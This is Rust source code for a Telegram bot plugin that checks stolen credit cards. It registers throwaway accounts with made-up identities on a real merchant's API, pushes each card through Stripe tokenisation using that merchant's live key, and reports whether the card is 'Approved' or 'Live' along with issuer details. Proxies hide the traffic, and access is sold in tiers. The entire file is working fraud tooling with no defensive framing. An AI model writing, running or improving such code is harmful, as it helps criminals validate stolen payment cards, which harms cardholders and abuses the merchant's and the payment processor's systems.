use crate::config::get_config;
use crate::database::sql::{self, fetch_user};
use crate::handle_database_error;
use crate::logging::{get_logger, LoggerHandle};
use crate::plugin_handler::*;
use crate::plugins::helpers::utils::bin_lookup::lookup_bin;
use crate::plugins::helpers::*;
use crate::safe_database_operation;
use chrono::Utc;
use rand::Rng;
use regex::Regex;
use reqwest;
use serde::{Deserialize, Serialize};
use teloxide::payloads::{EditMessageTextSetters, SendMessageSetters};
use teloxide::sugar::request::RequestLinkPreviewExt;
use teloxide::types::{Message, ParseMode};
use teloxide::{prelude::Requester, Bot};
use teloxide_plugin::TeloxidePlugin;

// Helper function to create HTTP client with proxy
fn create_proxy_client() -> Result<reqwest::Client, String> {
    let config = get_config().map_err(|e| e.to_string())?;

    if let Some(proxy_url) = &config.config.proxy.proxy {
        let proxy =
            reqwest::Proxy::all(proxy_url).map_err(|e| format!("Failed to create proxy: {}", e))?;

        reqwest::Client::builder()
            .proxy(proxy)
            .timeout(std::time::Duration::from_secs(30))
            .build()
            .map_err(|e| format!("Failed to create client with proxy: {}", e))
    } else {
        reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .build()
            .map_err(|e| format!("Failed to create client: {}", e))
    }
}

lazy_static::lazy_static! {
    static ref LOGGER: std::sync::Arc<LoggerHandle> = {
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(get_logger("STAPlugin"))
        })
    };
}

// Random user data generation
fn generate_random_user() -> (String, String, String, String, String) {
    let first_names = vec![
        "John", "Jane", "Michael", "Sarah", "David", "Emily", "James", "Jessica", "Robert",
        "Ashley",
    ];
    let last_names = vec![
        "Smith",
        "Johnson",
        "Williams",
        "Brown",
        "Jones",
        "Garcia",
        "Miller",
        "Davis",
        "Rodriguez",
        "Martinez",
    ];

    let mut rng = rand::rng();
    let first_name = first_names[rng.random_range(0..first_names.len())].to_string();
    let last_name = last_names[rng.random_range(0..last_names.len())].to_string();
    let phone = format!(
        "+1{}{}{}{}{}{}{}{}{}{}",
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10)
    );
    let email = format!(
        "{}.{}{}@gmail.com",
        first_name.to_lowercase(),
        last_name.to_lowercase(),
        rng.random_range(100..999)
    );
    let password = format!("{}{}", phone, "1990-01-01");

    (first_name, last_name, phone, email, password)
}

#[TeloxidePlugin(commands = ["sta", "sta@KissShotChkBot"])]
pub struct STAPlugin;
impl STAPlugin {
    pub async fn handle(&self, bot: &Bot, message: &Message, msg: &str) {
        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let user_id = message.from.as_ref().map(|u| u.id.0).unwrap_or(0) as i64;
        let chat_id = message.chat.id.0 as i64;

        let mut input_text = msg.to_string();
        if msg.len() < 16 {
            if let Some(reply) = message.reply_to_message().as_ref() {
                if let Some(reply_text) = reply.text() {
                    input_text = reply_text.to_string();
                }
            }
        }

        let credit_cards = Regex::new(
            get_config()
                .expect("Operation failed")
                .config
                .regex
                .cc_regex
                .as_str(),
        )
        .unwrap();

        let credit_cards_list: Vec<&str> = match credit_cards.find(input_text.as_str()) {
            Some(m) => vec![m.as_str()],
            None => Vec::new(),
        };

        if credit_cards_list.is_empty() {
            let reply = "<b>No credit cards found ❌</b>";
            bot.send_message(message.chat.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let sent_msg = bot
            .send_message(message.chat.id, "<b>Processing...</b>")
            .parse_mode(ParseMode::Html)
            .disable_link_preview(true)
            .await
            .unwrap();

        if !check_registration(user_id).await {
            let access_denied_reason = "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are not registered. Please use: /register";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        } else if check_banned(user_id).await {
            let access_denied_reason =
                "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are banned from using this bot.";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        } else if !check_access(chat_id).await {
            let access_denied_reason = "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are not allowed to access this gateway here. Consider using it at: @heckervaultchat";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let cooldown_remaining = get_antispam(user_id).await;
        if cooldown_remaining > 0 {
            let reply = format!(
                "<b>Antispam ⏱️</b>\n\n<b>Please retry after: {} seconds</b>",
                cooldown_remaining
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let user_cooldown = get_user_cooldown(user_id).await;
        if user_cooldown == 0 {
            if let Err(e) = set_user_antispam(user_id, 10).await {
                // Log error but don't fail the request
                println!("Failed to set antispam for user {}: {}", user_id, e);
            }
        }

        let mut results = Vec::new();
        let mut sta_responses: Vec<Option<String>> = Vec::new();
        let start_time = std::time::Instant::now();

        for cc in credit_cards_list.iter() {
            let card_number = cc.split('|').next().unwrap_or(cc);

            if !luhn_check(card_number) {
                results.push(format!(
                    "<code>{}</code>\n<b>Status:</b> Invalid",
                    cc.replace(" | ", "|")
                ));
                sta_responses.push(None);
            } else {
                match lookup_sta(cc).await {
                    Ok(response) => {
                        let status = if response.contains("Approved") || response.contains("Live") {
                            "Approved ✅"
                        } else {
                            "Declined ❌"
                        };
                        results.push(format!(
                            "<code>{}</code>\n<b>Status:</b> {}",
                            cc.replace(" | ", "|"),
                            status
                        ));
                        sta_responses.push(Some(response));
                    }
                    Err(_) => {
                        results.push(format!(
                            "<code>{}</code>\n<b>Status:</b> Error",
                            cc.replace(" | ", "|")
                        ));
                        sta_responses.push(None);
                    }
                }
            }

            tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
        }

        let total_time = start_time.elapsed().as_secs_f64();
        let final_text = if credit_cards_list.len() == 1 {
            // Gather requester info
            let (first_name, profile_url) = if let Some(u) = message.from.as_ref() {
                let fname = u.first_name.clone();
                let url = if let Some(username) = u.username.clone() {
                    format!("https://t.me/{}", username)
                } else {
                    format!("tg://user?id={}", u.id.0)
                };
                (fname, url)
            } else {
                ("User".to_string(), "#".to_string())
            };

            // Determine role
            let role = match fetch_user(user_id).await {
                Ok(Some(u)) => match u.status.as_str() {
                    "ADMIN" => "Admin".to_string(),
                    "PREMIUM" => "Premium".to_string(),
                    _ => "Free".to_string(),
                },
                _ => "Free".to_string(),
            };

            // Proxy status
            let proxy_live = get_config()
                .expect("Operation failed")
                .config
                .proxy
                .proxy
                .is_some();
            let proxy_str = if proxy_live { "Live" } else { "Off" };

            // Get the actual response to determine both status and response text
            let (status, response_text) = if let Some(Some(resp)) = sta_responses.get(0) {
                let is_approved = resp.contains("Approved") || resp.contains("Live");
                let status = if is_approved {
                    "Approved ✅"
                } else {
                    "Declined ❌"
                };

                let mut txt = resp.replace("✅", "").replace("❌", "").trim().to_string();

                // Remove "Approved -" prefix if present
                if txt.starts_with("Approved - ") {
                    txt = txt[11..].trim().to_string();
                } else if txt.starts_with("Approved ") {
                    txt = txt[9..].trim().to_string();
                }

                // If the response looks verbose (contains Status/Request metadata), keep only the final human message
                if txt.contains("Request ") || txt.contains("Status ") {
                    if let Some(idx) = txt.rfind(") ") {
                        let tail = txt[idx + 2..].trim();
                        if !tail.is_empty() {
                            txt = tail.to_string();
                        }
                    } else if let Some(idx) = txt.rfind(" - ") {
                        let tail = txt[idx + 3..].trim();
                        if !tail.is_empty() {
                            txt = tail.to_string();
                        }
                    }
                }
                (status, txt)
            } else {
                let is_approved = results[0].contains("Approved");
                let status = if is_approved {
                    "Approved ✅"
                } else {
                    "Declined ❌"
                };
                let response_text = if is_approved {
                    "Approved".to_string()
                } else {
                    "Declined".to_string()
                };
                (status, response_text)
            };

            let bin_info = match lookup_bin(&credit_cards_list[0][..6]).await {
                Ok(bin_data) => format!(
                    "\n\n<b>Info</b>: {} - {} - {}\n<b>Issuer</b>: {}\n<b>Country</b>: {} {}\n\n<b>Requested</b>: <a href=\"{}\">{}</a> [{}]\n<b>Proxy</b>: {}  <b>Retry</b>: 0\n<b>Time</b>: {:.2} seconds",
                    bin_data.vendor, bin_data.btype, bin_data.level, bin_data.bank, bin_data.country, bin_data.flag, profile_url, first_name, role, proxy_str, total_time
                ),
                Err(_) => format!(
                    "\n\n<b>Requested</b>: <a href=\"{}\">{}</a> [{}]\n<b>Proxy</b>: {} | <b>Retry</b>: 0\n<b>Time</b>: {:.2} seconds",
                    profile_url, first_name, role, proxy_str, total_time
                )
            };

            format!(
                "<b>{}</b>\n\n<b>Card</b>: <code>{}</code>\n<b>Gateway</b>: Stripe Auth\n<b>Response</b>: {}{}",
                status,
                credit_cards_list[0].replace(" | ", "|"),
                response_text,
                bin_info
            )
        } else {
            format!(
                "<b>Total:</b> <code>{}</code> | <b>Processed:</b> <code>{}</code>\n\n{}\n\n<b>Time:</b> {:.2}s",
                credit_cards_list.len(),
                results.len(),
                results.join("\n\n"),
                total_time
            )
        };

        bot.edit_message_text(message.chat.id, sent_msg.id, final_text)
            .parse_mode(ParseMode::Html)
            .disable_link_preview(true)
            .await
            .unwrap();
    }
}

#[derive(Debug, Deserialize)]
pub struct UserResponse {
    pub user: User,
}

#[derive(Debug, Deserialize)]
pub struct User {
    pub id: i32,
}

#[derive(Debug, Deserialize)]
pub struct TokenResponse {
    pub jwt: String,
}

#[derive(Debug, Deserialize)]
pub struct StripeTokenResponse {
    pub id: String,
    pub error: Option<StripeError>,
}

#[derive(Debug, Deserialize)]
pub struct StripeError {
    pub message: String,
}

#[derive(Debug, Deserialize)]
pub struct CreditCardResponse {
    pub credit_card: Option<Vec<String>>,
}

pub async fn lookup_sta(cc: &str) -> Result<String, String> {
    let client = create_proxy_client()?;

    // Generate random user data
    let (fname, lname, phone, email, password) = generate_random_user();

    // Step 1: Create user
    let user_payload = serde_json::json!({
        "user": {
            "first_name": fname,
            "last_name": lname,
            "phone": phone,
            "email": email,
            "password": password,
            "tag_list": []
        }
    });

    let user_resp = client
        .post("https://flynyon-api-prod.herokuapp.com/v1/users")
        .header("Content-Type", "application/json")
        .json(&user_payload)
        .send()
        .await
        .map_err(|e| {
            let _ = LOGGER.error(&format!("Failed to create user: {}", e));
            "Failed to create user account".to_string()
        })?;

    let user_data: UserResponse = user_resp.json().await.map_err(|e| {
        let _ = LOGGER.error(&format!("Failed to parse user response: {}", e));
        "Failed to create user account".to_string()
    })?;
    let user_id = user_data.user.id;

    // Step 2: Get JWT token
    let token_payload = serde_json::json!({
        "auth": {
            "email": email,
            "password": password
        }
    });

    let token_resp = client
        .post("https://flynyon-api-prod.herokuapp.com/v1/user_token")
        .header("Content-Type", "application/json")
        .json(&token_payload)
        .send()
        .await
        .map_err(|e| {
            let _ = LOGGER.error(&format!("Failed to get authentication token: {}", e));
            "Failed to authenticate user".to_string()
        })?;

    let token_data: TokenResponse = token_resp.json().await.map_err(|e| {
        let _ = LOGGER.error(&format!("Failed to parse token response: {}", e));
        "Failed to authenticate user".to_string()
    })?;
    let jwt = token_data.jwt;

    // Step 3: Create Stripe token
    let cc_parts: Vec<&str> = cc.split('|').collect();
    if cc_parts.len() < 4 {
        return Err("Invalid credit card format".to_string());
    }

    let zip = "10001"; // Default zip code
    let stripe_params = format!(
        "card[number]={}&card[cvc]={}&card[exp_month]={}&card[exp_year]={}&card[address_zip]={}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5816dc8686%3B+stripe-js-v3%2F5816dc8686%3B+card-element&referrer=https%3A%2F%2Fwww.flynyon.com&time_on_page=13073&key=pk_live_ZOyakEb8O1XR7ZYzxKV0FhFC",
        cc_parts[0], cc_parts[3], cc_parts[1], cc_parts[2], zip
    );

    let stripe_resp = client
        .post("https://api.stripe.com/v1/tokens")
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(stripe_params)
        .send()
        .await
        .map_err(|e| {
            let _ = LOGGER.error(&format!("Failed to create Stripe token: {}", e));
            "Failed to process payment method".to_string()
        })?;

    let stripe_data: StripeTokenResponse = stripe_resp.json().await.map_err(|e| {
        let _ = LOGGER.error(&format!("Failed to parse Stripe response: {}", e));
        "Failed to process payment method".to_string()
    })?;

    if let Some(error) = stripe_data.error {
        return Ok(format!("Declined ❌ - {}", error.message));
    }

    let stripe_id = stripe_data.id;

    // Step 4: Add credit card to user
    let cc_payload = serde_json::json!({
        "credit_card": {
            "stripe_token": stripe_id
        }
    });

    let cc_resp = client
        .post(&format!(
            "https://flynyon-api-prod.herokuapp.com/v1/users/{}/credit_cards?brand_id=1",
            user_id
        ))
        .header("Content-Type", "application/json")
        .header("Authorization", format!("Bearer {}", jwt))
        .json(&cc_payload)
        .send()
        .await
        .map_err(|e| {
            let _ = LOGGER.error(&format!("Failed to add credit card: {}", e));
            "Failed to process credit card".to_string()
        })?;

    let response_text = cc_resp.text().await.map_err(|e| {
        let _ = LOGGER.error(&format!("Failed to read credit card response: {}", e));
        "Failed to process credit card".to_string()
    })?;

    // Parse response based on Python logic
    if response_text.contains("requires_action") {
        Ok("Approved ✅ - Authentication required".to_string())
    } else if response_text.contains("invalid_account") {
        Ok("Approved ✅ - Your account is invalid".to_string())
    } else if response_text.contains("not_supported") {
        Ok("Approved ✅ - Your card does not support this type of purchase".to_string())
    } else if response_text.contains("insufficient_funds") {
        Ok("Approved ✅ - Your card has insufficient funds".to_string())
    } else if response_text.contains("invalid_cvc") {
        Ok("Approved ✅ - Your card's security code is incorrect".to_string())
    } else if response_text.contains("cus_") {
        let brand = if cc_parts[0].starts_with('4') {
            "Visa"
        } else if cc_parts[0].starts_with('5') {
            "Mastercard"
        } else if cc_parts[0].starts_with('3') {
            "Amex"
        } else if cc_parts[0].starts_with('6') {
            "Discover"
        } else {
            "Unknown"
        };

        let last4 = &cc_parts[0][cc_parts[0].len() - 4..];
        let exp_month = cc_parts[1];
        let exp_year = &cc_parts[2][cc_parts[2].len() - 2..];

        Ok(format!(
            "Approved ✅ - New payment method added: {} ending in {} (expires {}/{})",
            brand, last4, exp_month, exp_year
        ))
    } else {
        // Try to parse as JSON for error messages
        if let Ok(cc_data) = serde_json::from_str::<CreditCardResponse>(&response_text) {
            if let Some(errors) = cc_data.credit_card {
                if !errors.is_empty() {
                    return Ok(format!("Declined ❌ - {}", errors[0]));
                }
            }
        }
        Ok(format!("Declined ❌ - {}", response_text))
    }
}
